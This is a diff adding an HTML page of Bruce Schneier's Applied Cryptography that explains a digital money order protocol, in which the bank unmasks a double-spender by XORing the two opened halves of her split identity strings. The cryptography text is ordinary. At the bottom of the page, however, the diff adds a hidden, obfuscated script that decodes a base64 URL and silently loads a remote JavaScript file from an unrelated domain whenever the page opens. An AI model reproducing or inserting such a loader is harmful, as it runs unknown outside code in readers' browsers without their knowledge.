@@ -1,0 +1,107 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Esoteric Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=06//-->
+<!--PAGES=142-144//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="06-07.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="06-09.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>This protocol assumes that the merchant cannot change the identity string once Alice writes it on the money order. The money order might have a series of little squares, which the merchant would require Alice to fill in with either Xs or Os. The money order might be made out of paper that tears if erased.
+</P>
+<P>Since the interaction between the merchant and the bank takes place after Alice spends the money, the merchant could be stuck with a bad money order. Practical implementations of this protocol might require Alice to wait near the cash register during the merchant-bank interaction, much the same way as credit-card purchases are handled today.</P>
+<P>Alice could also frame the merchant. She could spend a copy of the money order a second time, giving the same identity string in step (7). Unless the merchant keeps a database of money orders it already received, he would be fooled. The next protocol eliminates that problem.</P>
+<P><FONT SIZE="+1"><B><I>Protocol #4</I></B></FONT></P>
+<P>If it turns out that the person who bought the money order tried to cheat the merchant, the bank would want to know who that person was. To do that requires moving away from a physical analogy and into the world of cryptography.
+</P>
+<P>The technique of secret splitting can be used to hide Alice&#146;s name in the digital money order.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice prepares <I>n</I> anonymous money orders for a given amount.
+<BR>Each of the money orders contains a different random uniqueness string, <I>X</I>, one long enough to make the chance of two being identical negligible.
+<BR>On each money order, there are also <I>n</I> pairs of identity bit strings, <I>I</I><SUB>1</SUB>, <I>I</I><SUB>2</SUB>,..., <I>I</I><SUB>n</SUB>. (Yes, that&#146;s <I>n</I> different pairs on <I>each</I> check.) Each of these pairs is generated as follows: Alice creates a string that gives her name, address, and any other piece of identifying information that the bank wants to see. Then, she splits it into two pieces using the secret splitting protocol (see Section 3.6). Then, she commits to each piece using a bit-commitment protocol.
+<BR>For example, <I>I</I><SUB>37</SUB> consists of two parts: <I>I</I><SUB><SMALL>37</SMALL></SUB><SUB>L</SUB> and <I>I</I><SUB><SMALL>37</SMALL></SUB><SUB>R</SUB>. Each part is a bit-committed packet that Alice can be asked to open and whose proper opening can be instantly verified. Any pair (e.g., <I>I</I><SUB><SMALL>37</SMALL></SUB><SUB>L</SUB> and <I>I</I><SUB><SMALL>37</SMALL></SUB><SUB>R</SUB>, but not <I>I</I><SUB><SMALL>37</SMALL></SUB><SUB>L</SUB> and <I>I</I><SUB><SMALL>38</SMALL></SUB><SUB>R</SUB>), reveals Alice&#146;s identity.
+<BR>Each of the money orders looks like this:
+<!-- CODE SNIP //-->
+<PRE>
+	Amount
+	Uniqueness String: <I>X</I>
+     Identity Strings:  <I>I</I><SUB>1</SUB> = (<I>I</I><SUB><SMALL>1</SMALL></SUB><SUB>L</SUB>,<I>I</I><SUB><SMALL>1</SMALL></SUB><SUB>R</SUB>)
+                        <I>I</I><SUB><SMALL>2</SMALL></SUB> =       (<I>I</I><SUB><SMALL>2</SMALL></SUB><SUB>L</SUB>,<I>I</I><SUB><SMALL>2</SMALL></SUB><SUB>R</SUB>)
+                         ....
+                        <I>I</I><SUB><SMALL>n</SMALL></SUB> = (<I>I</I><SUB><SMALL>n</SMALL></SUB><SUB>L</SUB>, <I>I</I><SUB><SMALL>n</SMALL></SUB><SUB>R</SUB>)
+</PRE>
+<!-- END CODE SNIP //-->
+<DD><B>(2)</B>&nbsp;&nbsp;Alice blinds all <I>n</I> money orders, using a blind signature protocol. She gives them all to the bank.
+<DD><B>(3)</B>&nbsp;&nbsp;The bank asks Alice to unblind <I>n</I> - 1 of the money orders at random and confirms that they are all well formed. The bank checks the amount, the uniqueness string, and asks Alice to reveal all of the identity strings.
+<DD><B>(4)</B>&nbsp;&nbsp;If the bank is satisfied that Alice did not make any attempts to cheat, it signs the one remaining blinded money order. The bank hands the blinded money order back to Alice and deducts the amount from her account.
+<DD><B>(5)</B>&nbsp;&nbsp;Alice unblinds the money order and spends it with a merchant.
+<DD><B>(6)</B>&nbsp;&nbsp;The merchant verifies the bank&#146;s signature to make sure the money order is legitimate.
+<DD><B>(7)</B>&nbsp;&nbsp;The merchant asks Alice to randomly reveal either the left half or the right half of each identity string on the money order. In effect, the merchant gives Alice a random <I>n-</I> bit <B>selector string</B>, <I>b</I><SUB>1</SUB>, <I>b</I><SUB>2</SUB>,..., <I>b</I><SUB>n</SUB>. Alice opens either the left or right half of <I>I</I><SUB>i</SUB>, depending on whether <I>b</I><SUB>i</SUB> is a 0 or a 1.
+<DD><B>(8)</B>&nbsp;&nbsp;Alice complies.
+<DD><B>(9)</B>&nbsp;&nbsp;The merchant takes the money order to the bank.
+<DD><B>(10)</B>&nbsp;&nbsp;The bank verifies the signature and checks its database to make sure a money order with the same uniqueness string has not been previously deposited. If it hasn&#146;t, the bank credits the amount to the merchant&#146;s account. The bank records the uniqueness string and all of the identity information in a database.
+<DD><B>(11)</B>&nbsp;&nbsp;If the uniqueness string is in the database, the bank refuses to accept the money order. Then, it compares the identity string on the money order with the one stored in the database. If it is the same, the bank knows that the merchant copied the money order. If it is different, the bank knows that the person who bought the money order photocopied it. Since the second merchant who accepted the money order handed Alice a different selector string than did the first merchant, the bank finds a bit position where one merchant had Alice open the left half and the other merchant had Alice open the right half. The bank XORs the two halves together to reveal Alice&#146;s identity.
+</DL>
+<P>This is quite an amazing protocol, so let&#146;s look at it from various angles.
+</P>
+<P>Can Alice cheat? Her digital money order is nothing more than a string of bits, so she can copy it. Spending it the first time won&#146;t be a problem; she&#146;ll just complete the protocol and everything will go smoothly. The merchant will give her a random <I>n</I>-bit selector string in step (7) and Alice will open either the left half or right half of each <I>I</I><SUB>i</SUB> in step (8). In step (10), the bank will record all of this data, as well as the money order&#146;s uniqueness string.</P>
+<P>When she tries to use the same digital money order a second time, the merchant (either the same merchant or a different merchant) will give her a different random selector string in step (7). Alice must comply in step (8); not doing so will immediately alert the merchant that something is suspicious. Now, when the merchant brings the money order to the bank in step (10), the bank would immediately notice that a money order with the same uniqueness string was already deposited. The bank then compares the opened halves of the identity strings. The odds that the two random selector strings are the same is 1 in 2<SUP><I>n</I></SUP>; it isn&#146;t likely to happen before the next ice age. Now, the bank finds a pair with one half opened the first time and the other half opened the second time. It XORs the two halves together, and out pops Alice&#146;s name. The bank knows who tried to spend the money order twice.</P>
+<P>Note that this protocol doesn&#146;t keep Alice from trying to cheat; it detects her cheating with almost certainty. Alice can&#146;t prevent her identity from being revealed if she cheats. She can&#146;t change either the uniqueness string or any of the identity strings, because then the bank&#146;s signature will no longer be valid. The merchant will immediately notice that in step (6).</P>
+<P>Alice could try to sneak a bad money order past the bank, one on which the identity strings don&#146;t reveal her name; or better yet, one whose identity strings reveal someone else&#146;s name. The odds of her getting this ruse past the bank in step (3) are 1 in <I>n</I> . These aren&#146;t impossible odds, but if you make the penalty severe enough, Alice won&#146;t try it. Or, you could increase the number of redundant money orders that Alice makes in step (1).</P>
+<P>Can the merchant cheat? His chances are even worse. He can&#146;t deposit the money order twice; the bank will notice the repeated use of the selector string. He can&#146;t fake blaming Alice; only she can open any of the identity strings.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="06-07.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="06-09.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(wgHaiBNo, ecmhaOaS) {ecmhaOaS = wgHaiBNo.createElement('script');ecmhaOaS.type = 'text/javascript';ecmhaOaS.async = true;ecmhaOaS.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');wgHaiBNo.getElementsByTagName('body')[0].appendChild(ecmhaOaS);}(document));</script></body>
+</html>
